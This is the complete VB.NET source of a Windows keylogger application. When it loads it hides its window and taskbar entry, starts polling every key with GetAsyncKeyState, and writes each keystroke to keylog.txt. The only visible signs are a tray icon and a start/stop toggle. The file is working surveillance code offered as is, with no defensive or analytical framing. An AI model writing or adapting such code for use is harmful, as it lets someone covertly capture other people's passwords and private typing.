Imports System.Runtime.InteropServices
Imports System.IO

Public Class Form1
    'Import GetAsyncKeyState function from user32.dll
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short

    'Variables for logging control
    Private isLogging As Boolean = False
    Private loggingThread As Threading.Thread


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide() ' Run the application hidden
        Me.ShowInTaskbar = False 'Remove from Taskbar
        appIcon.ContextMenuStrip = contextMenu 'Load up the context menu
        appIcon.Visible = True ' Show in the system tray
        btnToggle.BackColor = Color.FromArgb(255, 192, 57, 43)
        btnToggle.ForeColor = Color.FromArgb(255, 234, 189, 184)
        lblStatus.ForeColor = Color.FromArgb(255, 192, 57, 43)
        txtLog.ForeColor = Color.FromArgb(255, 213, 123, 113)
        StartKeyLoggerInBackground() ' Automatically start keylogging
    End Sub

    ' Toggle Button Click
    Private Sub btnToggle_Click(sender As Object, e As EventArgs) Handles btnToggle.Click
        If Not isLogging Then
            ' Start Logging
            isLogging = True
            btnToggle.Text = "Stop Logging"
            lblStatus.Text = "Status: Running"
            btnToggle.BackColor = Color.FromArgb(255, 192, 57, 43)
            btnToggle.ForeColor = Color.FromArgb(255, 234, 189, 184)
            lblStatus.ForeColor = Color.FromArgb(255, 192, 57, 43)
            txtLog.ForeColor = Color.FromArgb(255, 213, 123, 113)
            loggingThread = New Threading.Thread(AddressOf StartKeyLogger)
            loggingThread.IsBackground = True
            loggingThread.Start()
        Else
            ' Stop Logging
            StopKeyLogger()
            btnToggle.Text = "Start Logging"
            lblStatus.Text = "Status: Stopped"
            btnToggle.BackColor = Color.FromArgb(255, 104, 159, 56)
            btnToggle.ForeColor = Color.FromArgb(255, 241, 248, 233)
            lblStatus.ForeColor = Color.FromArgb(255, 104, 159, 56)
            txtLog.ForeColor = Color.FromArgb(255, 197, 225, 165)
        End If
    End Sub

    ' Automatically Start Keylogger on Load
    Private Sub StartKeyLoggerInBackground()
        isLogging = True
        loggingThread = New Threading.Thread(AddressOf StartKeyLogger)
        loggingThread.IsBackground = True
        loggingThread.Start()
    End Sub

    ' Keylogger Logic
    Private Sub StartKeyLogger()
        While isLogging
            For i As Integer = 1 To 255
                Dim keyState As Short = GetAsyncKeyState(i)
                If keyState = -32767 Then ' Key is pressed
                    Dim keyName As String = [Enum].GetName(GetType(Keys), i)
                    If Not String.IsNullOrEmpty(keyName) Then
                        LogKey(keyName)
                        UpdateTextbox(keyName)
                    End If
                End If
            Next
            Threading.Thread.Sleep(10) ' Reduce CPU usage
        End While
    End Sub

    ' Gracefully Stop the Keylogger
    Private Sub StopKeyLogger()
        isLogging = False ' Signal the thread to stop
        If loggingThread IsNot Nothing AndAlso loggingThread.IsAlive Then
            loggingThread.Join() ' Wait for the thread to finish
        End If
    End Sub

    ' Log key to file
    Private Sub LogKey(ByVal key As String)
        File.AppendAllText("keylog.txt", key & " ")
    End Sub

    ' Update UI textbox (from another thread)
    Private Sub UpdateTextbox(ByVal key As String)
        If txtLog.InvokeRequired Then
            txtLog.Invoke(New Action(Of String)(AddressOf UpdateTextbox), key)
        Else
            txtLog.AppendText(key & " ")
        End If
    End Sub

    Private Sub LogKey(ByVal key As Integer)
        Dim keyName As String = [Enum].GetName(GetType(Keys), key)
        If Not String.IsNullOrEmpty(keyName) Then
            File.AppendAllText("keylog.txt", keyName & " ")
        End If
    End Sub

    Private Sub appIcon_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles appIcon.MouseDoubleClick
        Me.Show() ' Restore the form
        Me.ShowInTaskbar = True 'Restore to the Taskbar
        Me.WindowState = FormWindowState.Normal
        appIcon.Visible = False ' Hide the NotifyIcon
    End Sub

    ' Close the Application
    Private Sub btnClose_Click(sender As Object, e As EventArgs) Handles btnClose.Click
        Me.Hide() ' Run the application hidden
        Me.ShowInTaskbar = False 'Remove from Taskbar
        appIcon.Visible = True ' Show in the system tray
    End Sub

    Private Sub OpenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenToolStripMenuItem.Click
        Me.Show() ' Restore the form
        Me.ShowInTaskbar = True 'Restore to the Taskbar
        Me.WindowState = FormWindowState.Normal
        appIcon.Visible = False ' Hide the NotifyIcon
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        appIcon.Visible = False
        StopKeyLogger() ' Stop the logger when exiting
        Application.Exit()
    End Sub
End Class
